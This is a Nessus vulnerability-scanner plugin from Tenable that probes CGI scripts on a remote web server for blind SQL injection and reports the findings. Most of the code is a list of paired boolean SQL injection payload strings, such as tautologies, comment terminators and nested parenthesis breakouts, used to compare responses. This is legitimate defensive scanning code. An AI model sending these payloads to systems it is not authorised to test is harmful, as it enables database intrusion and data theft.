#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(42424);
 script_version ("$Revision: 1.33 $");

 script_name(english: "CGI Generic SQL Injection (blind)");
 script_summary(english: "Blind SQL injection techniques");


 script_set_attribute(attribute:"synopsis", value:
"A CGI application hosted on the remote web server is potentially
prone to SQL injection attack.");
 script_set_attribute(attribute:"description", value:
"By sending specially crafted parameters to one or more CGI scripts
hosted on the remote web server, Nessus was able to get a very
different response, which suggests that it may have been able to
modify the behavior of the application and directly access the
underlying database. 

An attacker may be able to exploit this issue to bypass
authentication, read confidential data, modify the remote database, or
even take control of the remote operating system. 

Note that this script is experimental and may be prone to false
positives." );
 script_set_attribute(attribute:"see_also", value:"http://www.securiteam.com/securityreviews/5DP0N1P76E.html" );
 # https://web.archive.org/web/20101230192555/http://www.securitydocs.com/library/2651
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ed792cf5" );
 script_set_attribute(attribute:"see_also", value:"http://projects.webappsec.org/SQL-Injection");
 script_set_attribute(attribute:"solution", value:
"Modify the affected CGI scripts so that they properly escape
arguments." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cwe_id(
  20,  # Improper input validation
  77,  # Improper neutralization of special characters
  801, # 2010 Top 25 - Insecure Interaction Between Components
  810, # OWASP Top Ten 2010 Category A1 - Injection
  89,  # SQL injection
  91,  # XML Injection aka Blind XPath Injection
  203, # Information Exposure Through Discrepancy
  643, # Improper Neutralization of Data within XPath Expressions 'XPath Injection'
  713, # OWASP Top 10 2007 A2
  722, # OWASP Top 10 2004 A1
  727, # OWASP Top 10 2004 A6
  751, # 2009 Top 25 - Insecure Interaction Between Components
  928, # Weaknesses in OWASP Top Ten 2013
  929  # OWASP Top Ten 2013 Category A1 - Injection
 );
 script_set_attribute(attribute:"plugin_publication_date", value:"2009/11/06");
 script_cvs_date("$Date: 2017/01/05 15:28:31 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 # It is not dangerous, but we want it to run after the basic SQLi tests
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("http_version.nasl", "webmirror.nasl", "web_app_test_settings.nasl", "torture_cgi_load_estimation1.nasl");
 script_require_ports("Services/www", 80);
 script_timeout(43200);	# Timeout is managed by the script itself
 script_require_keys("Settings/enable_web_app_tests");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("torture_cgi_yesno.inc");
include("url_func.inc");

####

# 2009-03-06: I switched AND/OR to lowercase. SQL is case insensitive,
# but XPath is not.
i = 0;
poison_ok[i] = "'+and+'b'>'a";  poison_ko[i++] = "'+and+'b'<'a";
poison_ok[i] = "'+and+'b'<'a";  poison_ko[i++] = "'+and+'b'>'a";
poison_ok[i] = "+and+1=1";  poison_ko[i++] = "+and+1=0";
poison_ok[i] = "+and+1=0";  poison_ko[i++] = "+and+1=1";
poison_ok[i] = "+and+1=1)"; poison_ko[i++] = "+and+1=0)";
poison_ok[i] = "+and+1=0)"; poison_ko[i++] = "+and+1=1)";
# Will work with /simple/ SQL requests like "SELECT * FROM users WHERE id=$ID;"
# MySQL requires a space or other control character after the double dash
poison_ok[i] = "+and+1=1;--+";  poison_ko[i++] = "+and+1=0;--+";
poison_ok[i] = "+and+1=0;--+";  poison_ko[i++] = "+and+1=1;--+";
# Try single ORs first since it's a shorter payload
poison_ok[i] = "+or+1=1"; poison_ko[i++] = "+or+1=0";
poison_ok[i] = "+or+1=0"; poison_ko[i++] = "+or+1=1";
poison_ok[i] = "'+or+'1'='1"; poison_ko[i++] = "'+or+'1'='0";
poison_ok[i] = "'+or+'1'='0"; poison_ko[i++] = "'+or+'1'='1";
poison_ok[i] = ")+or+(1=1"; poison_ko[i++] = ")+or+(1=0";
poison_ok[i] = ")+or+(1=0"; poison_ko[i++] = ")+or+(1=1";
poison_ok[i] = "')+or+('1'='1"; poison_ko[i++] = "')+or+('1'='0";
poison_ok[i] = "')+or+('1'='0"; poison_ko[i++] = "')+or+('1'='1";
# Double ORs overrides AND precedence
poison_ok[i] = "+or+1=1+or+1=1"; poison_ko[i++] = "+or+1=0+or+1=0";
poison_ok[i] = "+or+1=0+or+1=0"; poison_ko[i++] = "+or+1=1+or+1=1";
poison_ok[i] = "'+or+1=1+or+'1'='1"; poison_ko[i++] = "'+or+1=0+or+'1'='0";
poison_ok[i] = "'+or+1=0+or+'1'='0"; poison_ko[i++] = "'+or+1=1+or+'1'='1";
poison_ok[i] = ")+or+1=1+or+(1=1"; poison_ko[i++] = ")+or+1=0+or+(1=0";
poison_ok[i] = ")+or+1=0+or+(1=0"; poison_ko[i++] = ")+or+1=1+or+(1=1";
poison_ok[i] = "')+or+1=1+or+('1'='1"; poison_ko[i++] = "')+or+1=0+or+('1'='0";
poison_ok[i] = "')+or+1=0+or+('1'='0"; poison_ko[i++] = "')+or+1=1+or+('1'='1";

if (thorough_tests || experimental_scripts)
{
# %2b = +
poison_ok[i] = "+%2b+0"; poison_ko[i++] = "+%2b+42";
poison_ok[i] = "+%2b+42"; poison_ko[i++] = "+%2b+0";
# Second request will get all lines from a table, and maybe an error
# as OR has a lower priority than AND
poison_ok[i] = "'+or+'b'='a"; poison_ko[i++] = "'+or+'b'='b";
poison_ok[i] = "'+or+'b'='b"; poison_ko[i++] = "'+or+'b'='a";
poison_ok[i] = "+or+1=0"; poison_ko[i++] = "+or+0=0";
poison_ok[i] = "+or+0=0"; poison_ko[i++] = "+or+1=0";

poison_ok[i] = "'||'VALUE"; poison_ko[i++] = "zzVALUEyy";
poison_ok[i] = "zzVALUEyy"; poison_ko[i++] = "'||'VALUE";
poison_ok[i] = "'+'VALUE";  poison_ko[i++] = "zzVALUEyy";
poison_ok[i] = "zzVALUEyy"; poison_ko[i++] = "'+'VALUE";
poison_ok[i] = "'%20'VALUE";  poison_ko[i++] = "zzVALUEyy";
poison_ok[i] = "zzVALUEyy"; poison_ko[i++] = "'%20'VALUE";

# deeply nested subquery variations with single and double ORs
poison_ok[i] = "))+or+((1=1"; poison_ko[i++] = "))+or+((1=0";
poison_ok[i] = "))+or+((1=0"; poison_ko[i++] = "))+or+((1=1";
poison_ok[i] = ")))+or+(((1=1"; poison_ko[i++] = ")))+or+(((1=0";
poison_ok[i] = ")))+or+(((1=0"; poison_ko[i++] = ")))+or+(((1=1";
poison_ok[i] = "))+or+1=1+or+((1=1"; poison_ko[i++] = "))+or+1=0+or+((1=0";
poison_ok[i] = "))+or+1=0+or+((1=0"; poison_ko[i++] = "))+or+1=1+or+((1=1";
poison_ok[i] = ")))+or+1=1+or+(((1=1"; poison_ko[i++] = ")))+or+1=0+or+(((1=0";
poison_ok[i] = ")))+or+1=0+or+(((1=0"; poison_ko[i++] = ")))+or+1=1+or+(((1=1";
poison_ok[i] = "'))+or+(('1'='1"; poison_ko[i++] = "'))+or+(('1'='0";
poison_ok[i] = "'))+or+(('1'='0"; poison_ko[i++] = "'))+or+(('1'='1";
poison_ok[i] = "')))+or+((('1'='1"; poison_ko[i++] = "')))+or+((('1'='0";
poison_ok[i] = "')))+or+((('1'='0"; poison_ko[i++] = "')))+or+((('1'='1";
poison_ok[i] = "'))+or+1=1+or+(('1'='1"; poison_ko[i++] = "'))+or+1=0+or+(('1'='0";
poison_ok[i] = "'))+or+1=0+or+(('1'='0"; poison_ko[i++] = "'))+or+1=1+or+(('1'='1";
poison_ok[i] = "')))+or+1=1+or+((('1'='1"; poison_ko[i++] = "')))+or+1=0+or+((('1'='0";
poison_ok[i] = "')))+or+1=0+or+((('1'='0"; poison_ko[i++] = "')))+or+1=1+or+((('1'='1";
}

################

port = torture_cgi_init(vul:'SB');

if (! thorough_tests && stop_at_first_flaw == "port" && get_kb_item('www/'+port+'/SQLInjection')) exit(0, strcat('A SQL injection was already found on port ', port));

report = torture_cgis_yesno(port: port, vul: "SB");
if (strlen(report) > 0)
{
  security_hole(port:port, extra: report);
}
